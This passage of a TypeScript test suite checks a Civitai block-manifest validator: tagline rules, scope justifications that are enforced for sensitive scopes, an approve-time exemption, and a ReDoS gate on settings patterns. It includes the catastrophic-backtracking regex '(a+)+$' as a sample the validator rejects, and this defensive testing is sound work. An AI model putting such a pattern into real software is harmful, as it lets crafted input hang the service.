        expect(
          result.errors.some((e) => e === `tagline must be ≤${MANIFEST_TAGLINE_MAX_LENGTH} chars`)
        ).toBe(true);
      }
    });

    it.each<[unknown, string]>([
      [42, 'number'],
      [null, 'null'],
      [{ text: 'hi' }, 'object'],
      [['hi'], 'array'],
      [true, 'boolean'],
    ])('rejects a non-string tagline %j (%s)', (tagline) => {
      const manifest = { ...VALID_MANIFEST, tagline };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e === 'tagline must be a string')).toBe(true);
      }
    });

    it.each([
      ['', 'empty string'],
      ['   ', 'spaces only'],
      ['\n\t ', 'whitespace only'],
    ])('rejects a blank tagline %j (%s) — omit it instead', (tagline) => {
      const manifest = { ...VALID_MANIFEST, tagline };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some((e) => e === 'tagline must not be blank (omit it instead)')
        ).toBe(true);
      }
    });

    it('does not regress the other manifest rules (a bad blockId still fails alongside a good tagline)', () => {
      const manifest = { ...VALID_MANIFEST, blockId: 'X', tagline: 'fine' };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.startsWith('blockId must be'))).toBe(true);
        expect(result.errors.some((e) => e.startsWith('tagline'))).toBe(false);
      }
    });
  });

  // Per-scope justifications — OPTIONAL, backward-compatible dev-supplied map of
  // scope-id → rationale (captured for mod review; NOT verified by the platform).
  describe('scopeJustifications (optional per-scope rationale)', () => {
    it('accepts a manifest with NO scopeJustifications (optional, backward-compatible)', () => {
      // VALID_MANIFEST declares no scopeJustifications.
      expect(BlockManifestValidator.validate(VALID_MANIFEST, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts a justification keyed by a declared scope', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopeJustifications: { 'models:read:self': 'We render the page model in a comparison widget.' },
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts an empty scopeJustifications object', () => {
      const manifest = { ...VALID_MANIFEST, scopeJustifications: {} };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts a justification at the max length boundary (500 chars)', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopeJustifications: { 'models:read:self': 'a'.repeat(500) },
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('rejects a justification for a scope NOT in the manifest scopes', () => {
      const manifest = {
        ...VALID_MANIFEST,
        // user:read:self is a real block scope but is NOT declared in scopes here.
        scopeJustifications: { 'user:read:self': 'reason' },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some((e) => e.includes('user:read:self') && e.includes('not in the manifest'))
        ).toBe(true);
      }
    });

    it('rejects a justification longer than 500 chars', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopeJustifications: { 'models:read:self': 'a'.repeat(501) },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('≤500 chars'))).toBe(true);
      }
    });

    it.each<[unknown, string]>([
      ['', 'empty string'],
      [42, 'non-string'],
      [null, 'null'],
    ])('rejects a %j (%s) justification value', (value) => {
      const manifest = {
        ...VALID_MANIFEST,
        scopeJustifications: { 'models:read:self': value },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('models:read:self'))).toBe(true);
      }
    });

    it.each<[unknown, string]>([
      [['models:read:self'], 'an array'],
      [null, 'null'],
      ['reason', 'a string'],
    ])('rejects scopeJustifications that is %s (not a plain object)', (scopeJustifications) => {
      const manifest = { ...VALID_MANIFEST, scopeJustifications };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some((e) => e.startsWith('scopeJustifications must be an object'))
        ).toBe(true);
      }
    });
  });

  // ENFORCEMENT: a declared SENSITIVE scope (money / private data / cross-user
  // write) now REQUIRES a non-empty justification — this used to be optional
  // metadata. Runs in `validate`, so it covers every submit path (CLI
  // submit-version + web updateManifest both funnel through validateSubmission →
  // validate). `apps:storage:shared:write` / `collections:read:private` are
  // sensitive AND SKIP_OAUTH_CHECK, so they need no extra OAuth bit; the
  // AI context covers `ai:write:budgeted` (requires AIServicesWrite).
  describe('scopeJustifications — ENFORCED for sensitive scopes', () => {
    const AI_APP_CTX = {
      allowedScopes: TokenScope.ModelsRead | TokenScope.AIServicesWrite,
      allowedOrigins: ['https://blocks.civitai.com'],
    };

    it('REJECTS a sensitive scope with NO scopeJustifications (previously accepted)', () => {
      // ai:write:budgeted can spend the viewer's Buzz — a justification is now required.
      const manifest = { ...VALID_MANIFEST, scopes: ['ai:write:budgeted'] };
      const result = BlockManifestValidator.validate(manifest, AI_APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some(
            (e) => e.includes('sensitive scopes require a justification') && e.includes('ai:write:budgeted')
          )
        ).toBe(true);
      }
    });

    it('REJECTS a sensitive scope when scopeJustifications is present but omits its key', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['models:read:self', 'apps:storage:shared:write'],
        // Justifies the non-sensitive scope but not the sensitive one.
        scopeJustifications: { 'models:read:self': 'We render the page model.' },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some(
            (e) =>
              e.includes('sensitive scopes require a justification') &&
              e.includes('apps:storage:shared:write')
          )
        ).toBe(true);
      }
    });

    it.each<[string, string]>([
      ['', 'empty string'],
      ['   ', 'whitespace-only'],
      ['\t\n', 'tabs/newlines only'],
    ])('REJECTS a sensitive scope justified with a %j (%s) value', (value) => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['apps:storage:shared:write'],
        scopeJustifications: { 'apps:storage:shared:write': value },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('apps:storage:shared:write'))).toBe(true);
      }
    });

    it('ACCEPTS a sensitive scope WITH a non-empty justification', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['apps:storage:shared:write'],
        scopeJustifications: {
          'apps:storage:shared:write': 'We persist shared gallery entries other users can see.',
        },
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('ACCEPTS a NON-sensitive scope with no justification (unchanged)', () => {
      const manifest = { ...VALID_MANIFEST, scopes: ['models:read:self'] };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('lists ALL unjustified sensitive scopes when several are missing', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['collections:read:private', 'apps:storage:shared:write'],
        // Neither sensitive scope justified.
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        const err = result.errors.find((e) =>
          e.includes('sensitive scopes require a justification')
        );
        expect(err).toBeDefined();
        expect(err).toContain('collections:read:private');
        expect(err).toContain('apps:storage:shared:write');
      }
    });

    it('rejects naming ONLY the unjustified sensitive scope when some are justified', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['collections:read:private', 'apps:storage:shared:write'],
        scopeJustifications: { 'collections:read:private': 'We read the viewer’s private collections.' },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        const err = result.errors.find((e) =>
          e.includes('sensitive scopes require a justification')
        );
        expect(err).toBeDefined();
        expect(err).toContain('apps:storage:shared:write');
        expect(err).not.toContain('collections:read:private');
      }
    });

    it('still applies the shape rules (keys ⊆ scopes, ≤500, non-empty) alongside enforcement', () => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['apps:storage:shared:write'],
        scopeJustifications: {
          'apps:storage:shared:write': 'ok reason',
          // A justification for a scope NOT declared — still rejected by the shape rule.
          'user:read:self': 'dangling',
        },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some((e) => e.includes('user:read:self') && e.includes('not in the manifest'))
        ).toBe(true);
      }
    });

    // SUBMIT-vs-APPROVE: the enforcement is SUBMIT-only. The moderator approve
    // re-validation passes `enforceSensitiveScopeJustification:false` so a LEGACY
    // pending request (sensitive scope, no justification, valid under the old
    // rules) stays approvable — but ALL OTHER manifest checks still run on approve.
    describe('SUBMIT-only (approve exemption)', () => {
      it('SUBMIT context (default) still REJECTS a sensitive scope with no justification', () => {
        const manifest = { ...VALID_MANIFEST, scopes: ['apps:storage:shared:write'] };
        // Default (no opts) = genuine submit = enforce.
        expect(BlockManifestValidator.validate(manifest, APP_CTX).valid).toBe(false);
      });

      it('APPROVE context (enforceSensitiveScopeJustification:false) does NOT reject on the sensitive-scope rule', () => {
        const manifest = { ...VALID_MANIFEST, scopes: ['apps:storage:shared:write'] };
        const result = BlockManifestValidator.validate(manifest, APP_CTX, {
          enforceSensitiveScopeJustification: false,
        });
        expect(result).toEqual({ valid: true });
      });

      it('APPROVE context is exempted through validateSubmission too', async () => {
        const manifest = { ...VALID_MANIFEST, scopes: ['collections:read:private'] };
        const result = await BlockManifestValidator.validateSubmission(manifest, APP_CTX, {
          enforceSensitiveScopeJustification: false,
        });
        expect(result).toEqual({ valid: true });
      });

      it('APPROVE context STILL enforces every OTHER manifest rule (only this one is exempt)', () => {
        // A sensitive scope with no justification (would pass the exempted rule)
        // but also an UNKNOWN scope + a non-https iframe.src — both must still fail.
        const manifest = {
          ...VALID_MANIFEST,
          scopes: ['apps:storage:shared:write', 'models:read:all'],
          iframe: { ...VALID_MANIFEST.iframe, src: 'http://blocks.civitai.com/test' },
        };
        const result = BlockManifestValidator.validate(manifest, APP_CTX, {
          enforceSensitiveScopeJustification: false,
        });
        expect(result.valid).toBe(false);
        if (!result.valid) {
          expect(result.errors.some((e) => e.includes('not a known block scope'))).toBe(true);
          expect(result.errors.some((e) => e.includes('iframe.src'))).toBe(true);
          // The exempted rule did NOT contribute an error.
          expect(
            result.errors.some((e) => e.includes('sensitive scopes require a justification'))
          ).toBe(false);
        }
      });
    });
  });

  // SUBMISSION gate: validateSubmission = the synchronous shape/security checks
  // PLUS the accurate ReDoS + input-bound gate on settings-field patterns. This
  // is what every manifest-SUBMISSION path calls (git-push webhook, developer
  // API, blocks.updateManifest, publish-request approve).
  describe('validateSubmission — settings pattern ReDoS gate', () => {
    const withSettings = (settings: Record<string, unknown>) => ({ ...VALID_MANIFEST, settings });
    const stringField = (extra: Record<string, unknown>) => ({
      scope: 'publisher',
      type: 'string',
      widget: 'text',
      label: 'L',
      description: 'D',
      ...extra,
    });

    it('accepts a normal manifest with no settings', async () => {
      expect(await BlockManifestValidator.validateSubmission(VALID_MANIFEST, APP_CTX)).toEqual({
        valid: true,
      });
    });

    it.each([
      ['^[a-z0-9]+(-[a-z0-9]+)*$', 'slug'],
      ['^\\d{1,4}(\\.\\d{1,2})?$', 'decimal'],
      ['^[a-z0-9]+(_[a-z0-9]+)*$', 'snake_case'],
    ])('accepts a safe patterned field (%s)', async (pattern) => {
      const manifest = withSettings({ f: stringField({ pattern, max_length: 64 }) });
      expect(await BlockManifestValidator.validateSubmission(manifest, APP_CTX)).toEqual({
        valid: true,
      });
    });

    it('rejects an exponential (ReDoS) pattern with a dev-facing error', async () => {
      const manifest = withSettings({ evil: stringField({ pattern: '(a+)+$', max_length: 64 }) });
      const result = await BlockManifestValidator.validateSubmission(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => /settings\.evil.*ReDoS/i.test(e))).toBe(true);
      }
    });

    it('rejects a patterned field that omits max_length', async () => {
      const manifest = withSettings({ code: stringField({ pattern: '^[a-z]+$' }) });
      const result = await BlockManifestValidator.validateSubmission(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => /must also declare "max_length"/.test(e))).toBe(true);
      }
    });

    it('merges base (shape) errors with settings-pattern errors', async () => {
      // bad blockId (base error) AND a ReDoS pattern (settings error) at once.
      const manifest = withSettings({ evil: stringField({ pattern: '(a+)+$', max_length: 64 }) });
      manifest.blockId = 'Bad_Id';
      const result = await BlockManifestValidator.validateSubmission(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('blockId'))).toBe(true);
        expect(result.errors.some((e) => /settings\.evil.*ReDoS/i.test(e))).toBe(true);
      }
    });
  });
});
